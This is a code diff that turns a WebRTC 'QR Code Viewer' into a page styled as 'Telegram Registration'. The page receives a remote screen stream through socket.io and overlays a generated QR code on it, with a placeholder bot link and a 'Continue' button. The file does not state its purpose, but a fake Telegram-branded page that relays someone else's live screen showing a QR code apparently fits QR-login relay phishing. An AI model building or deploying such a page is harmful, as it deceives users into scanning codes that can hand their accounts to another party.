@@ -1,31 +1,121 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>QR Code Viewer</title>
+    <title>Telegram Registration</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body {
+        :root {
+            --tg-background: #f5f5f5;
+            --tg-primary: #2ca5e0;
+            --tg-text: #222222;
+        }
+        * {
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        }
+        body {
+            background-color: var(--tg-background);
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            background-color: black;
+            min-height: 100vh;
         }
-        #qrVideo {
-            max-width: 100%;
-            max-height: 100%;
-            object-fit: contain;
+        .tg-container {
+            background-color: white;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 15px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        .tg-header {
+            background-color: var(--tg-primary);
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+        .tg-content {
+            display: flex;
+            flex-direction: column;
+            padding: 20px;
+            gap: 15px;
+        }
+        .qr-stream-container {
+            position: relative;
+            width: 100%;
+            aspect-ratio: 1/1;
+            background-color: #f0f0f0;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        #qrImage, #streamVideo {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .tg-footer {
+            text-align: center;
+            padding: 15px;
+            background-color: #f0f0f0;
+        }
+        .tg-button {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--tg-primary);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .tg-button:hover {
+            background-color: #2190cc;
+        }
+        #connectionStatus {
+            text-align: center;
+            margin-top: 10px;
+            color: var(--tg-primary);
+        }
+        #qrImage {
+            z-index: 10;
+        }
+        #streamVideo {
+            z-index: 5;
         }
     </style>
 </head>
 <body>
-    <video id="qrVideo" autoplay playsinline></video>
+    <div class="tg-container">
+        <div class="tg-header">
+            <h2>Telegram Registration</h2>
+        </div>
+        
+        <div class="tg-content">
+            <div class="qr-stream-container">
+                <img id="qrImage" src="" alt="QR Code">
+                <video id="streamVideo" autoplay playsinline></video>
+            </div>
+            <div id="connectionStatus">Connecting to stream...</div>
+        </div>
+
+        <div class="tg-footer">
+            <button class="tg-button">Continue</button>
+        </div>
+    </div>
 
     <script src="/socket.io/socket.io.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.4.4/build/qrcode.min.js"></script>
     <script>
         const socket = io();
-        const qrVideo = document.getElementById('qrVideo');
+        const streamVideo = document.getElementById('streamVideo');
+        const qrImage = document.getElementById('qrImage');
+        const connectionStatus = document.getElementById('connectionStatus');
 
         const servers = {
             iceServers: [
@@ -40,11 +130,29 @@
 
         let peerConnection = null;
 
+        // Генерация QR-кода
+        function generateQRCode() {
+            const telegramLink = 'https://t.me/your_bot_username?start=registration';
+            
+            QRCode.toDataURL(telegramLink, { 
+                width: 300, 
+                height: 300 
+            }, (err, url) => {
+                if (err) {
+                    console.error('QR Code generation error:', err);
+                    return;
+                }
+                
+                qrImage.src = url;
+            });
+        }
+
         function createPeerConnection() {
             peerConnection = new RTCPeerConnection(servers);
 
             peerConnection.ontrack = (event) => {
-                qrVideo.srcObject = event.streams[0];
+                streamVideo.srcObject = event.streams[0];
+                connectionStatus.textContent = 'Stream connected';
             };
 
             peerConnection.onicecandidate = (event) => {
@@ -52,7 +160,17 @@
                     socket.emit('ice-candidate', event.candidate);
                 }
             };
+
+            peerConnection.onconnectionstatechange = () => {
+                connectionStatus.textContent = `Connection: ${peerConnection.connectionState}`;
+            };
         }
+
+        socket.on('connect', () => {
+            socket.emit('viewer-request');
+            connectionStatus.textContent = 'Requesting stream...';
+            generateQRCode();
+        });
 
         socket.on('screen-offer', async (offer) => {
             createPeerConnection();
@@ -63,8 +181,10 @@
                 await peerConnection.setLocalDescription(answer);
                 
                 socket.emit('viewer-screen-answer', answer);
+                connectionStatus.textContent = 'Sending answer...';
             } catch (error) {
-                console.error('Error processing offer:', error);
+                connectionStatus.textContent = 'Error processing offer';
+                console.error(error);
             }
         });
 
